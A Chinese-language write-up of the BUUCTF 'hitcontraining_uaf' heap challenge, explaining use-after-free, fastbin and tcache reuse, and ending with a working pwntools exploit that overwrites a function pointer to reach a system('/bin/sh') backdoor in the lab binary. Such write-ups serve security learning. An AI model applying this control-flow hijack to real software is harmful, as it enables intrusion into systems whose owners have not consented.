# BUUCTF[PWN] [堆]

题目：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#hitcontraining_uaf)

## Use After Free 

1. 简单的说，Use After Free 就是其字面所表达的意思，当一个**内存块被释放之后再次被使用**。但是其实这里有以下几种情况:
   - 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。
   - 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，**没有代码对这块内存块进行修改**，那么程序很有可能可以正常运转。
   - 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，**有代码对这块内存进行了修改**，那么当程序再次使用这块内存时，**就很有可能会出现奇怪的问题**。
2. 而我们一般所指的 **Use After Free** 漏洞主要是后两种。此外，我们一般称**被释放后没有被设置为 NULL 的内存指针**为 **dangling pointer**。



## 例题：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#hitcontraining_uaf)

注意：

1. 程序del是没有将申请的指针清零，导致可以再次调用输出print。

2. fast bin的分配释放的方式。在fast bin中，是由单项链表连接起来的，每个chunk的pre_chunk指向之前回收的chunk，即回收的chunk出于链表头部，此时 **分配时也会从头部分配** ，这里值得补充的是fast bin在free的时候并 **不检查double free** ，这样可以形成循环链表，循环链表可以有利于chunk循环利用，free(0)->free(1)->free(0)。

3. 查看add_note函数：根据当前 **notelist** 是否为空，来申请了一个8字节的空间将地址(指针)放在notelist[i]中，申请的空间的前4个字节用来存放 **print_note_content** 信息。然后又在该申请的空间的后4个字节中，放上了新申请的空间的地址，用来存放后续read输入的字符串。

   ![image-20240705201733561](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407052017657.png)

   ![image-20240705204024201](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407052040240.png)

   ![image-20240705203327521](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407052033588.png)

   ![image-20240705203352180](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407052033275.png)

4. 再看一下del_note函数：先是检查了一下index的范围，再检检查一下当前的notelist列表上是否为空，即检查add时第一步申请的空间的指针，后续释放了两次的空间，但是有个问题：该notelist表还没有清空，指向这个地址的指针还存在于notelist中。

   ![](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407052035944.png)

5. 再查看print_note函数：同样检查了index是否查出范围，然后判断当前notelist是否为空，如果指针再里面就直接通过指针调用puts函数输出note的内容。

   ![image-20240705204015268](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407052040343.png)

6. 所以我们可以利用UAF，用magic函数的地址来，覆盖掉print_note_content的地址，这样再调用输出时就会直接执行sytem("/bin/sh")，拿到shell。

   * 先申请两个较大的堆：size=20，但是直接给了32个字节，所以用户申请的空间和程序实际分配的空间不一定相当。

   ![image-20240705205307078](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407052053196.png)

   * 再释放掉这两个堆：申请的4个空间都进入Tcache bin中，相同的大小再统一个数组中，每个数组中一个链表，上面的是先进入的，下面是后进入的，Tcache 的后入先出原则，下次会将下面的先出链表。

   ![image-20240705205515040](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407052055101.png)

   * 再申请一个10大小的note：可以看到，程序直接将之前free的两个0x10大小的空间分配给了用户，一个用来参访print_note_content函数内容(add中先申请的，下面的先出链表），一个用来存放read输入的字符串(add中后申请的，上面后出链表)。

     ![image-20240705210436090](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407052104201.png)

   * 此时仔细观察，就会的发现我们第三次输入的值 **cccc** ,覆盖掉了第一次申请的堆(0x20大小)中存放的print_note_content函数的地址，如果此时直接调用print_note，就会执行我们输入的值所指向的地址出的代码，所以直接用 **magic函数的地址** 来作为第三次的输入，覆盖掉原本 **print_note_content函数的地址** ，从而挟持程序的控制流，即使在print_note内部检查时，由于(&notelist)[0]处的值不为0（因为程序调用del_note释放时没有清零），仍会执行magic函数。

     ![image-20240705211337393](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407052113433.png)

     此时index=1和index=2的输出都会是 **cccc** ，因为题目调用的是同一片空间上的函数地址.UAF的魅力就在于次.

     ![image-20240705211702253](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407052117306.png)

     ![image-20240705212121202](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407052121245.png)

7. EXP：

   ```python
   from pwn import *
   from LibcSearcher import *
   context(os='linux', arch='amd64', log_level='debug')
   
   # p = remote("node5.buuoj.cn",26733)
   p = process("./hacknote")
   
   def add(size_,context_):
       p.sendlineafter(b'Your choice :',b'1')
       p.sendlineafter(b'Note size :',str(size_).encode())
       p.sendlineafter(b'Content :',context_.encode())
   
   def free(index):
       p.sendlineafter(b'Your choice :',b'2')
       p.sendlineafter(b'Index :',str(index).encode())
   
   def printf(index):
       p.sendlineafter(b'Your choice :',b'3')
       p.sendlineafter(b'Index :',str(index).encode())
   add(20,"aaaa")
   add(20,"bbb")
   free(0)
   free(1)
   #利用UAF
   p.sendlineafter(b'Your choice :',b'1')
   p.sendlineafter(b'Note size :',b'10')
   p.sendline(p32(0x08048945))
   #调用后门函数
   printf(0)
   p.sendline(b'cat flag')
   p.interactive()
   ```

   